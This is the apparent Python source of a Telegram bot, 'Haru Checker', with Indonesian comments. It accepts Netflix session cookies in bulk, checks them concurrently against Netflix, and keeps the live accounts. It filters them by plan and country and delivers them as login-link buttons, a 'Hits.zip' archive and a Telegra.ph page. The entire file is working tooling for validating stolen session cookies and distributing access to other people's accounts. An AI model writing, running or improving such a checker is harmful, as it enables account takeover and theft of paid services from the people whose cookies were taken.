import os
import asyncio
import time
import io
import zipfile
import tempfile
import re
import json
import sys
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

# Force UTF-8 stdout/stderr — biar emoji & karakter non-ASCII gak crash
# di Windows (default console encoding cp1252/charmap).
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace', line_buffering=True)
if hasattr(sys.stderr, 'reconfigure'):
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')

from dotenv import load_dotenv
load_dotenv()

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.constants import ParseMode
from telegram.error import TelegramError

from config import BOT_TOKEN, ADMIN_IDS, MAX_COOKIES_PER_REQUEST, FREE_LIMIT, MAX_CONCURRENCY, REQUEST_TIMEOUT, WELCOME_MSG, HELP_MSG, PORT

# Setup logging PROPER - flush immediately
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    stream=sys.stdout,
    force=True
)
logger = logging.getLogger(__name__)

# Load ADMIN_ID from env
ADMIN_ID = os.getenv('ADMIN_ID', '')
if ADMIN_ID and ADMIN_ID.isdigit():
    ADMIN_IDS.append(int(ADMIN_ID))

print("="*60, flush=True)
print("🚀 HARU CHECKER BOT v3.0 - STARTING...", flush=True)
print("="*60, flush=True)

# Queue 5 berbarengan, owner bypass — semua unlimited
MAX_CONCURRENT_JOBS = 5
processing_semaphore = asyncio.Semaphore(MAX_CONCURRENT_JOBS)

from checker.parser import extract_cookies_dict, parse_bulk_text, cookie_dict_to_header, netscape_from_dict
from checker.netflix import check_one_cookie
from checker.nftoken import build_links
from utils.formatter import format_account_block, flag
from utils.zipper import create_result_zip, build_valid_txt, build_hold_txt, build_invalid_txt

# ---------- helpers ----------
def parse_cookies_from_input(text: str):
    return parse_bulk_text(text)

async def download_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc=update.message.document
    for attempt in range(3):
        try:
            file=await doc.get_file()
            bio=io.BytesIO()
            await file.download_to_memory(bio)
            bio.seek(0)
            return doc.file_name, bio.getvalue()
        except Exception as e:
            if attempt == 2:
                raise
            await asyncio.sleep(1.5)

def extract_from_zip(zip_bytes: bytes):
    cookies=[]
    try:
        with zipfile.ZipFile(io.BytesIO(zip_bytes)) as z:
            for name in z.namelist():
                if name.endswith("/") : continue
                if not name.lower().endswith((".txt",".json")): continue
                data=z.read(name)
                try:
                    text=data.decode('utf-8', errors='ignore')
                except:
                    text=""
                # each file may contain multiple cookies lines or netscape single
                # try parse_bulk
                dicts=parse_bulk_text(text)
                if not dicts:
                    # try netscape single via extract
                    d=extract_cookies_dict(text)
                    if d.get("NetflixId"):
                        dicts=[d]
                for d in dicts:
                    cookies.append(d)
    except Exception as e:
        print("zip extract error", e)
    return cookies

def cookies_to_dicts_from_bytes(filename: str, data: bytes):
    cookies=[]
    low=filename.lower()
    if low.endswith(".zip"):
        cookies=extract_from_zip(data)
    elif low.endswith(".json"):
        try:
            text=data.decode('utf-8', errors='ignore')
            # json may be single file single account OR bulk? we treat as single
            from checker.parser import parse_json, parse_netscape, parse_raw
            # try bundle extraction similar to main.py: if it's array of cookie objects -> single
            # if not, fallback to bulk parse
            dicts=parse_bulk_text(text)
            if dicts:
                cookies.extend(dicts)
            else:
                d=extract_cookies_dict(text)
                if d.get("NetflixId"):
                    cookies.append(d)
        except Exception as e:
            print(e)
    else: # .txt or other
        try:
            text=data.decode('utf-8', errors='ignore')
            dicts=parse_bulk_text(text)
            if dicts:
                cookies.extend(dicts)
            else:
                # netscape single
                d=extract_cookies_dict(text)
                if d.get("NetflixId"):
                    cookies.append(d)
        except Exception as e:
            print(e)
    return cookies

# ---------- checking ----------
async def _process_inner(update: Update, context: ContextTypes.DEFAULT_TYPE, cookie_dicts, total, source_name, confirmed_limit=None):
    # semua logic berat dari status_msg sampai zip — dipisah biar bisa di-queue
    # confirmed_limit = berapa cookies yang mau dicek (dari user confirmation)
    if confirmed_limit and confirmed_limit < total:
        cookie_dicts = cookie_dicts[:confirmed_limit]
        total = confirmed_limit
    
    status_msg=await update.message.reply_text(f"📥 Downloading file...\n{source_name} — {total} cookies")
    await asyncio.sleep(0.5)
    try:
        await status_msg.edit_text(f"⚙️ PROCESSING COMPLETE ⚙️\nMemproses {total} cookies...")
    except: pass
    start=time.time()
    loop=asyncio.get_running_loop()
    results=await loop.run_in_executor(None, lambda: check_all_sync(cookie_dicts, True))
    elapsed=time.time()-start
    speed=total/elapsed if elapsed>0 else 0
    valid=[]
    holds=[]
    invalid=[]
    valid_infos=[]
    hold_infos=[]
    for r in results:
        if r["status"]=="valid":
            valid.append(r)
            valid_infos.append(r["info"] or {})
        elif r["status"]=="hold":
            holds.append(r)
            hold_infos.append(r["info"] or {})
        else:
            invalid.append(r)
    f_plan = context.user_data.get("filter_plan", "all") if context else "all"
    f_country = context.user_data.get("filter_country", "all") if context else "all"
    if f_plan != "all" or f_country != "all":
        orig_valid = len(valid)
        filtered=[]
        for r in valid:
            info = r.get("info") or {}
            plan = (info.get("localizedPlanName") or "").lower()
            country = (info.get("countryOfSignup") or "").upper()
            ok_plan = True
            if f_plan == "premium":
                ok_plan = "premium" in plan
            elif f_plan == "standard":
                ok_plan = "premium" not in plan
            ok_country = (f_country == "all" or country == f_country)
            if ok_plan and ok_country:
                filtered.append(r)
        if filtered or orig_valid>0:
            await update.message.reply_text(f"🔍 Filter aktif: Plan=<b>{f_plan}</b> Country=<b>{f_country}</b>\nHasil: {len(filtered)}/{orig_valid} Valid lolos filter", parse_mode=ParseMode.HTML)
        valid = filtered
    valid_blocks=[]
    for r in valid:
        d=r["cookie"]
        info=r["info"] or {"email":"unknown","localizedPlanName":"Unknown","countryOfSignup":"??"}
        nft=r["nftoken"]
        header=cookie_dict_to_header(d)
        block=format_account_block(0,d,info,nft,header)
        valid_blocks.append((block, d, info, nft))
    hold_blocks=[]
    for r in holds:
        d=r["cookie"]
        info=r["info"] or {}
        nft=r["nftoken"]
        block=format_account_block(0,d,info,nft,"")
        hold_blocks.append((block,d,info,nft))
    summary_text = (
        f"▓ PROCESSING COMPLETE ▓\n\n"
        f"📋 Total: {total}\n"
        f"✅ Valid: {len(valid)}\n"
        f"❌ Invalid/Hold: {len(holds) + len(invalid)}\n\n"
        f"⚡ Speed: {speed:.1f} cookies/sec\n"
        f"⏱ Time: {elapsed:.1f}s\n\n"
        f"💬 DM: @harumisatou\n"
        f"📢 Channel: @harumisatou"
    )
    try:
        await status_msg.edit_text(summary_text)
    except:
        await update.message.reply_text(summary_text)
    # HANYA KIRIM VALID — hold/invalid tidak perlu dikirim
    if not valid_blocks:
        await update.message.reply_text("❌ Tidak ada Valid accounts ditemukan")
        return
    
    # Kirim valid cards satu per satu dengan delay 1 detik
    if len(valid_blocks) > 50:
        try:
            await update.message.reply_text(
                f"ℹ️ {len(valid_blocks)} Valid ditemukan — akan dikirim satu per satu (1 detik/card). "
                f"Hasil lengkap tersedia di <b>valid_accounts.txt</b> + <b>Hits.zip</b> + Telegra.ph.",
                parse_mode=ParseMode.HTML,
            )
        except:
            pass
    
    for block,d,info,nft in valid_blocks:
        email=info.get("email") or "unknown"
        country=info.get("countryOfSignup") or "??"
        # Perbaikan plan parsing — coba semua field
        plan=info.get("localizedPlanName") or info.get("planPrice") or info.get("videoQuality") or "Unknown"
        if plan == "Unknown" and info.get("maxStreams"):
            streams = info.get("maxStreams")
            if streams == "4" or streams == 4:
                plan = "Premium (4 streams)"
            elif streams == "2" or streams == 2:
                plan = "Standard (2 streams)"
            else:
                plan = f"Unknown ({streams} streams)"
        country_flag=flag(country) if len(country)==2 else ""
        
        # Build buttons: PC, Mobile, TV
        buttons=[]
        if nft and nft.get("token"):
            tok=nft["token"]
            pc_url=f"https://www.netflix.com/browse?nftoken={tok}"
            mobile_url=f"https://www.netflix.com/unsupported?nftoken={tok}"
            tv_url=f"https://www.netflix.com/tv2?nftoken={tok}"
            buttons.append([
                InlineKeyboardButton("🖥 PC", url=pc_url), 
                InlineKeyboardButton("📱 Mobile", url=mobile_url),
                InlineKeyboardButton("📺 TV", url=tv_url)
            ])
        
        msg =(
            f"✅ <b>NETFLIX LIVE</b>\n"
            f"📧 Email: <code>{email}</code>\n"
            f"🌍 Country: {country} {country_flag}\n"
            f"📦 Plan: {plan}\n"
        )
        
        if not buttons:
            msg += f"\n<code>{cookie_dict_to_header(d)[:80]}...</code>"
        
        try:
            if buttons:
                await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(buttons))
            else:
                await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
            # KIRIM SATU PER SATU TIAP 1 DETIK
            await asyncio.sleep(1.0)
        except Exception as e:
            print("per-hit send error",e)
    # KIRIM FILE DAN ZIP HANYA VALID
    valid_txt = "\n\n".join([b for b,_,_,_ in valid_blocks]) if valid_blocks else "No valid accounts"
    
    async def send_txt_file(filename, content, caption):
        bio=io.BytesIO(content.encode('utf-8'))
        bio.name=filename
        try:
            await update.message.reply_document(document=bio, filename=filename, caption=caption)
        except Exception as e:
            print("send file error",e)
    
    # Kirim file valid_accounts.txt
    await send_txt_file("valid_accounts.txt", valid_txt, f"✅ {len(valid)} Valid (Active) Accounts")
    
    # Kirim ZIP hanya valid
    blocks_only=[b for b,_,_,_ in valid_blocks]
    infos_only=[info for _,_,info,_ in valid_blocks]
    zip_bytes, prem, norm = create_result_zip(blocks_only, [], infos_only, [])
    zip_summary = (
        f"⭐ Premium Hits » {prem}\n"
        f"✅ Normal Hits » {norm}\n"
        f"📦 Total » {prem+norm}\n\n"
        f"📁 ZIP structure:\n"
        f"Premium Hits/ — Premium account files\n"
        f"Normal Hits/ — Standard / Basic / other files\n"
        f"_SUMMARY.txt — Overview\n\n"
        f"<i>Each file: full details • cookie • login link</i>"
    )
    bio=io.BytesIO(zip_bytes)
    bio.name="Hits.zip"
    try:
        await update.message.reply_document(document=bio, filename="Hits.zip", caption=zip_summary, parse_mode=ParseMode.HTML)
    except Exception as e:
        print("zip send error",e)
    
    # Telegra.ph — biar gak perlu extract zip
    try:
        from utils.telegraph import create_telegraph_page
        loop2 = asyncio.get_running_loop()
        # ambil blocks dan infos yang sudah di-filter (tuple 4: block,d,info,nft)
        _blocks = [b for b, _, _, _ in valid_blocks]
        _infos = [inf for _, _, inf, _ in valid_blocks]
        # panggil sync di executor biar gak block
        url, err = await loop2.run_in_executor(None, lambda: create_telegraph_page(_blocks, _infos))
        if url:
            await update.message.reply_text(
                f"📄 <b>Telegra.ph</b> — Lihat semua akun tanpa extract zip\n{url}",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📖 Buka Telegra.ph", url=url)]])
            )
        elif err:
            print(f"telegraph error: {err}")
    except Exception as e:
        print(f"telegraph exception: {e}")

def check_all_sync(cookie_dicts, enable_nftoken=True):
    results=[]
    with ThreadPoolExecutor(max_workers=MAX_CONCURRENCY) as ex:
        futures={ex.submit(check_one_cookie, d, REQUEST_TIMEOUT, enable_nftoken): d for d in cookie_dicts}
        for fut in as_completed(futures):
            d=futures[fut]
            try:
                res=fut.result()
                res["cookie"]=d
                results.append(res)
            except Exception as e:
                results.append({"status":"invalid","info":None,"nftoken":None,"error":str(e),"cookie":d})
    return results

def get_limit_for(user_id: int) -> int:
    # Semua unlimited 10000 sesuai request
    return 10000

async def process_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE, cookie_dicts, source_name="input"):
    if not cookie_dicts:
        await update.message.reply_text("❌ Tidak ada cookies Netflix yang valid ditemukan. Pastikan format mengandung <code>NetflixId</code>", parse_mode=ParseMode.HTML)
        return
    user_id = update.effective_user.id if update.effective_user else 0
    limit = get_limit_for(user_id)
    is_owner = ADMIN_IDS and user_id in ADMIN_IDS
    
    total_found = len(cookie_dicts)
    
    # BULK CONFIRMATION: jika cookies > 100, tanya user mau cek berapa
    if total_found > 100:
        # Simpan cookies di context untuk dipakai nanti
        context.user_data["pending_cookies"] = cookie_dicts
        context.user_data["pending_source"] = source_name
        
        # Buat keyboard konfirmasi (cached untuk performa)
        kb = _get_bulk_confirm_keyboard()
        
        await update.message.reply_text(
            f"📋 <b>Total: {total_found} cookies</b>\n\n🔍 Mau cek berapa?\nPilih di bawah:",
            parse_mode=ParseMode.HTML,
            reply_markup=kb
        )
        return
    
    # Jika < 100, langsung proses tanpa konfirmasi
    if len(cookie_dicts) > limit:
        await update.message.reply_text(f"⚠️ Limit {limit} cookies/request. Kamu kirim {len(cookie_dicts)}, akan diproses {limit} pertama saja.")
        cookie_dicts=cookie_dicts[:limit]
    total=len(cookie_dicts)
    # queue 5 berbarengan, owner bypass
    if is_owner:
        print(f"[QUEUE] owner {user_id} bypass")
        await _process_inner(update, context, cookie_dicts, total, source_name)
    else:
        queue_msg = None
        if processing_semaphore._value == 0:
            try:
                queue_msg = await update.message.reply_text(f"⏳ Bot lagi rame (5/5 slot penuh)\nKamu antrian — akan jalan otomatis setelah ada slot kosong...")
            except: pass
        async with processing_semaphore:
            if queue_msg:
                try:
                    await queue_msg.edit_text(f"✅ Slot kosong! Memproses {total} cookies kamu sekarang...")
                    await asyncio.sleep(0.5)
                    await queue_msg.delete()
                except: pass
            await _process_inner(update, context, cookie_dicts, total, source_name)

# CACHE KEYBOARD untuk performa (build sekali, pakai berkali-kali)
_START_KEYBOARD_CACHE = None
_BULK_CONFIRM_KEYBOARD_CACHE = None
_BACK_KEYBOARD_CACHE = None

def get_start_keyboard():
    global _START_KEYBOARD_CACHE
    if _START_KEYBOARD_CACHE is None:
        _START_KEYBOARD_CACHE = InlineKeyboardMarkup([
            [InlineKeyboardButton("📁 Bulk Mode (.txt/.zip)", callback_data="bulk_mode"), InlineKeyboardButton("📄 Send Text", callback_data="send_text")],
            [InlineKeyboardButton("👤 Profil Saya", callback_data="profile"), InlineKeyboardButton("📖 Panduan", callback_data="guide")],
        ])
    return _START_KEYBOARD_CACHE

def _get_bulk_confirm_keyboard():
    global _BULK_CONFIRM_KEYBOARD_CACHE
    if _BULK_CONFIRM_KEYBOARD_CACHE is None:
        _BULK_CONFIRM_KEYBOARD_CACHE = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Cek Semua", callback_data="bulk_confirm_all")],
            [InlineKeyboardButton("📊 Cek 100", callback_data="bulk_confirm_100"),
             InlineKeyboardButton("📊 Cek 500", callback_data="bulk_confirm_500")],
            [InlineKeyboardButton("📊 Cek 1000", callback_data="bulk_confirm_1000"),
             InlineKeyboardButton("📊 Cek 2000", callback_data="bulk_confirm_2000")],
            [InlineKeyboardButton("❌ Batal", callback_data="bulk_cancel")]
        ])
    return _BULK_CONFIRM_KEYBOARD_CACHE

def _get_back_keyboard():
    global _BACK_KEYBOARD_CACHE
    if _BACK_KEYBOARD_CACHE is None:
        _BACK_KEYBOARD_CACHE = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Kembali", callback_data="back_menu")]])
    return _BACK_KEYBOARD_CACHE

# ---------- handlers ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id if update.effective_user else 0
    limit = get_limit_for(uid)
    is_owner = ADMIN_IDS and uid in ADMIN_IDS
    plan = "VIP ULTRA (Owner) — Unlimited & Priority" if is_owner else "Free — Unlimited (Queue 5 slot)"
    text = WELCOME_MSG.format(plan=plan, remaining="0", max_cookies=limit)
    kb = get_start_keyboard()
    # support both /start command and callback query "back to menu"
    if update.callback_query:
        try:
            await update.callback_query.answer()
            await update.callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        except:
            await update.callback_query.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    else:
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)

async def myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id if update.effective_user else 0
    is_owner = ADMIN_IDS and uid in ADMIN_IDS
    role = "Owner (Unlimited + Bypass Queue)" if is_owner else "Free (Unlimited, Queue 5 slot)"
    
    if not is_owner:
        tip = "\n\n💡 Copy ID ini untuk masukin ke .env (ADMIN_ID) jika ingin jadi owner."
    else:
        tip = ""
    
    await update.message.reply_text(f"🆔 ID kamu: <code>{uid}</code>\n👑 Role: {role}{tip}", parse_mode=ParseMode.HTML)

async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command /ping untuk test response time bot - OPTIMIZED"""
    t0 = time.perf_counter()
    msg = await update.message.reply_text("🏓")
    latency_ms = (time.perf_counter() - t0) * 1000
    await msg.edit_text(
        f"🏓 <b>Pong!</b>\n⚡ <b>{latency_ms:.0f}ms</b>\n✅ Bot READY",
        parse_mode=ParseMode.HTML
    )

async def stopbot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command /stopbot untuk stop bot paksa (Owner only)"""
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Command ini hanya untuk Owner bot.")
        return
    
    await update.message.reply_text("🛑 <b>Bot STOPPING in 2 seconds...</b>", parse_mode=ParseMode.HTML)
    logger.info(f"🛑 Bot stopped by Owner ID: {user_id}")
    await asyncio.sleep(1)
    
    # Force shutdown
    import signal
    os.kill(os.getpid(), signal.SIGTERM)

async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    data = q.data if q else ""
    
    # ANSWER CALLBACK SEGERA (anti timeout "Query is too old")
    try:
        await q.answer()
    except Exception as e:
        print(f"[WARN] Callback answer failed: {e}")
    
    # Handler untuk bulk confirmation
    if data.startswith("bulk_confirm_"):
        cookies = context.user_data.get("pending_cookies", [])
        source = context.user_data.get("pending_source", "bulk")
        
        if not cookies:
            await q.message.edit_text("❌ Session expired. Kirim ulang file-nya.")
            return
        
        user_id = q.from_user.id
        limit = get_limit_for(user_id)
        is_owner = ADMIN_IDS and user_id in ADMIN_IDS
        
        # Tentukan jumlah yang mau dicek
        if data == "bulk_confirm_all":
            confirmed_limit = len(cookies)
        elif data == "bulk_confirm_100":
            confirmed_limit = 100
        elif data == "bulk_confirm_500":
            confirmed_limit = 500
        elif data == "bulk_confirm_1000":
            confirmed_limit = 1000
        elif data == "bulk_confirm_2000":
            confirmed_limit = 2000
        else:
            confirmed_limit = len(cookies)
        
        # Batasi sesuai limit user
        if confirmed_limit > limit:
            confirmed_limit = limit
        
        # Hapus pending data
        context.user_data.pop("pending_cookies", None)
        context.user_data.pop("pending_source", None)
        
        # Edit message konfirmasi
        try:
            await q.message.edit_text(f"✅ Memproses {confirmed_limit} cookies dari total {len(cookies)}...")
        except:
            pass
        
        # Proses dengan limit yang dipilih
        cookie_subset = cookies[:confirmed_limit]
        total = len(cookie_subset)
        
        if is_owner:
            print(f"[QUEUE] owner {user_id} bypass")
            await _process_inner(update, context, cookie_subset, total, source, confirmed_limit)
        else:
            queue_msg = None
            if processing_semaphore._value == 0:
                try:
                    queue_msg = await q.message.reply_text(f"⏳ Bot lagi rame (5/5 slot penuh)\nKamu antrian — akan jalan otomatis setelah ada slot kosong...")
                except: pass
            async with processing_semaphore:
                if queue_msg:
                    try:
                        await queue_msg.edit_text(f"✅ Slot kosong! Memproses {total} cookies kamu sekarang...")
                        await asyncio.sleep(0.5)
                        await queue_msg.delete()
                    except: pass
                await _process_inner(update, context, cookie_subset, total, source, confirmed_limit)
        return
    
    elif data == "bulk_cancel":
        context.user_data.pop("pending_cookies", None)
        context.user_data.pop("pending_source", None)
        await q.message.edit_text("❌ Dibatalkan. Kirim ulang file jika ingin cek lagi.")
        return
    
    # EDIT MESSAGE untuk semua button (anti spam pesan baru)
    if data == "bulk_mode":
        lim = get_limit_for(q.from_user.id)
        await q.message.edit_text(
            f"📁 <b>Bulk Mode</b>\n\nKirim file <code>.txt</code> atau <code>.zip</code> berisi cookies Netflix (max {lim} per file).\n\n✅ Bot akan auto-scan semua.",
            parse_mode=ParseMode.HTML
        )
    elif data == "send_text":
        await q.message.edit_text(
            "📄 <b>Send Text</b>\n\nLangsung paste cookies Netflix di chat:\n<code>NetflixId=xxx; SecureNetflixId=xxx;</code>\n\n✅ Bisa multiple baris sekaligus.",
            parse_mode=ParseMode.HTML
        )
    elif data == "profile":
        is_owner = ADMIN_IDS and q.from_user.id in ADMIN_IDS
        role = "Owner (Unlimited + Bypass)" if is_owner else "Free (Unlimited, Queue 5)"
        limit = get_limit_for(q.from_user.id)
        await q.message.edit_text(
            f"👤 <b>Profil Saya</b>\n\n👑 Plan: {role}\n⚡ Capacity: {limit} cookies/request\n💎 Status: Active\n\n🆔 ID: <code>{q.from_user.id}</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=_get_back_keyboard()
        )
    elif data == "guide":
        await q.message.edit_text(
            HELP_MSG.format(max_cookies=MAX_COOKIES_PER_REQUEST),
            parse_mode=ParseMode.HTML,
            reply_markup=_get_back_keyboard()
        )
    elif data == "back_menu":
        # Edit message kembali ke menu utama
        await q.message.edit_text(
            WELCOME_MSG.format(max_cookies=MAX_COOKIES_PER_REQUEST),
            parse_mode=ParseMode.HTML,
            reply_markup=get_start_keyboard()
        )

# dummy handlers biar plek ketiplek PAMALI (tidak error unknown command)
async def bulk_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📁 <b>Bulk Mode</b> — Kirim file .txt/.zip langsung, bot akan scan massal.", parse_mode=ParseMode.HTML, reply_markup=get_start_keyboard())
async def basic_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["output_mode"] = "basic"
    await update.message.reply_text("👁 <b>Mode: BASIC</b>\nTampilan ringkas aktif — hanya Email, Country, Plan, dan tombol login.", parse_mode=ParseMode.HTML)
async def fullinfo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["output_mode"] = "fullinfo"
    await update.message.reply_text("👁 <b>Mode: FULLINFO</b>\nDetail lengkap aktif — akan kirim block lengkap + file.", parse_mode=ParseMode.HTML)
async def mode_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cur = context.user_data.get("output_mode", "basic")
    nxt = "fullinfo" if cur == "basic" else "basic"
    context.user_data["output_mode"] = nxt
    await update.message.reply_text(f"🔄 <b>Ganti Mode</b>\nMode sekarang: <b>{nxt.upper()}</b>\nGanti lagi pakai /basic atau /fullinfo", parse_mode=ParseMode.HTML)
async def filter_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        cur = context.user_data.get("filter_plan", "all")
        await update.message.reply_text(f"🎯 <b>Filter Paket</b>\nSekarang: <b>{cur}</b>\n\nGunakan:\n<code>/filter premium</code> — hanya Premium\n<code>/filter standard</code> — hanya Standard/Basic\n<code>/filter all</code> — tanpa filter", parse_mode=ParseMode.HTML)
        return
    val = args[0].lower()
    if val in ("premium", "standard", "basic", "all"):
        if val == "basic": val = "standard"
        context.user_data["filter_plan"] = val
        await update.message.reply_text(f"🎯 Filter diset ke: <b>{val}</b>", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("❌ Pilihan: premium / standard / all", parse_mode=ParseMode.HTML)
async def country_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        cur = context.user_data.get("filter_country", "all")
        await update.message.reply_text(f"🌍 <b>Filter Country</b>\nSekarang: <b>{cur}</b>\n\nGunakan:\n<code>/country US</code> — hanya US\n<code>/country ID</code> — hanya Indonesia\n<code>/country all</code> — tanpa filter", parse_mode=ParseMode.HTML)
        return
    val = args[0].upper()
    if val == "ALL":
        context.user_data["filter_country"] = "all"
        await update.message.reply_text("🌍 Filter country: <b>ALL</b> (tanpa filter)", parse_mode=ParseMode.HTML)
    elif len(val) == 2 and val.isalpha():
        context.user_data["filter_country"] = val
        await update.message.reply_text(f"🌍 Filter country diset ke: <b>{val}</b> {flag(val)}", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("❌ Format: <code>/country US</code> atau <code>/country all</code>", parse_mode=ParseMode.HTML)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(HELP_MSG.format(max_cookies=MAX_COOKIES_PER_REQUEST), parse_mode=ParseMode.HTML)

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text=update.message.text or ""
    if text.startswith("/"): return
    if "NetflixId" not in text:
        return # ignore non-cookie text
    dicts=parse_bulk_text(text)
    if not dicts:
        d=extract_cookies_dict(text)
        if d.get("NetflixId"):
            dicts=[d]
    await process_cookies(update, context, dicts, source_name="Direct paste")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        filename,bdata=await download_document(update, context)
        print(f"[DOC] received {filename} size={len(bdata)} from {update.effective_user.id}")
        cookies=cookies_to_dicts_from_bytes(filename, bdata)
        print(f"[DOC] parsed {len(cookies)} cookies")
        await process_cookies(update, context, cookies, source_name=filename)
    except Exception as e:
        import traceback
        print(f"[DOC] error: {e}")
        traceback.print_exc()
        try:
            await update.message.reply_text(f"❌ Error baca file: {e}")
        except: pass

# ---------- health server (opsional: HTTP /health untuk monitoring/uptime check) ----------
def _start_health_server():
    from http.server import BaseHTTPRequestHandler, HTTPServer
    import threading
    port = PORT
    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path in ("/", "/health"):
                try:
                    self.send_response(200)
                    self.send_header("Content-type", "text/plain")
                    self.end_headers()
                    self.wfile.write(b"OK - Haru Checker running")
                except:
                    pass
            else:
                try:
                    self.send_response(404)
                    self.end_headers()
                except:
                    pass
        def log_message(self, *a):
            return
    try:
        srv = HTTPServer(("0.0.0.0", port), H)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        print(f"Health server on :{port} (/health)")
    except Exception as e:
        print(f"Health server failed: {e}")

# ---------- main ----------
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Global error handler untuk catch semua error dan prevent crash"""
    logger.error(f"Exception while handling an update: {context.error}", exc_info=context.error)
    
    # Try to notify user
    try:
        if update and isinstance(update, Update) and update.effective_message:
            await update.effective_message.reply_text(
                "❌ <b>Terjadi error saat proses request kamu.</b>\n"
                "Coba lagi atau hubungi admin jika masalah berlanjut.",
                parse_mode=ParseMode.HTML
            )
    except Exception as e:
        logger.error(f"Failed to send error message to user: {e}")

def main():
    if not BOT_TOKEN or ":" not in BOT_TOKEN:
        print("BOT_TOKEN missing/invalid di .env (format: 123456:ABC-...)")
        print("Ambil token dari @BotFather lalu isi BOT_TOKEN lalu jalankan ulang.")
        return
    _start_health_server()
    
    # Build app dengan timeout lebih panjang
    from telegram.request import HTTPXRequest
    request = HTTPXRequest(
        connection_pool_size=8,
        connect_timeout=30.0,
        read_timeout=30.0,
        write_timeout=30.0,
        pool_timeout=30.0
    )
    app=Application.builder().token(BOT_TOKEN).request(request).build()
    
    # Add ERROR HANDLER GLOBAL (prevent crash)
    app.add_error_handler(error_handler)
    
    # Add command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("ping", ping))
    app.add_handler(CommandHandler("stopbot", stopbot))
    app.add_handler(CommandHandler("myid", myid))
    app.add_handler(CommandHandler("id", myid))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("price", help_cmd))
    app.add_handler(CommandHandler("bulk", bulk_cmd))
    app.add_handler(CommandHandler("basic", basic_cmd))
    app.add_handler(CommandHandler("fullinfo", fullinfo_cmd))
    app.add_handler(CommandHandler("mode", mode_cmd))
    app.add_handler(CommandHandler("filter", filter_cmd))
    app.add_handler(CommandHandler("country", country_cmd))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    # Healthcheck + polling
    print("🤖 Bot starting...")
    print(f"📡 Token: {BOT_TOKEN[:15]}...")
    print(f"👑 Admin ID: {ADMIN_ID if ADMIN_ID else 'Not set'}")
    print(f"🔧 Health server: http://0.0.0.0:{PORT}")
    
    # Set BotCommands untuk menu command di Telegram
    from telegram import BotCommand
    commands = [
        BotCommand("start", "Menu Utama"),
        BotCommand("ping", "Test Response Time Bot"),
        BotCommand("myid", "Cek ID Telegram & Role"),
        BotCommand("help", "Panduan Lengkap"),
        BotCommand("bulk", "Mode Scan Massal"),
        BotCommand("basic", "Tampilan Ringkas"),
        BotCommand("fullinfo", "Detail Lengkap"),
        BotCommand("mode", "Ganti Mode Output"),
        BotCommand("filter", "Filter Paket (Premium/Standard)"),
        BotCommand("country", "Filter Negara"),
        BotCommand("stopbot", "Stop Bot (Owner Only)"),
    ]
    
    async def post_init(application):
        try:
            bot_info = await application.bot.get_me()
            print(f"✅ Connected to Telegram API")
            print(f"🤖 Bot username: @{bot_info.username}")
            print(f"📝 Bot name: {bot_info.first_name}")
            await application.bot.set_my_commands(commands)
            print("✅ BotCommands set successfully")
            print("🚀 Bot is now running and ready!")
            print("─" * 50)
        except Exception as e:
            print(f"❌ Failed to connect to Telegram API: {e}")
            print("⚠️  Check your BOT_TOKEN or network connection")
    
    app.post_init = post_init
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True, stop_signals=None)

if __name__=="__main__":
    main()
